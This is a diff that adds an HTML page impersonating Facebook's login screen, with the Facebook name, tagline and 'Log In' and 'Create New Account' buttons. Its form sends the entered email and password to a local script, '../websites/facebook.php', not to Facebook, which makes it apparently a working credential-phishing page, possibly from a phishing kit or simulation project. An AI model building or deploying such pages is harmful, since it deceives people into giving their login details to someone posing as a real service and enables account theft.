@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="login-box">
+            <form action="../websites/facebook.php" method="POST">
+                <input type="text" name="email" placeholder="Email or Phone Number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#">Forgot Password?</a>
+                <hr>
+                <button type="button" class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
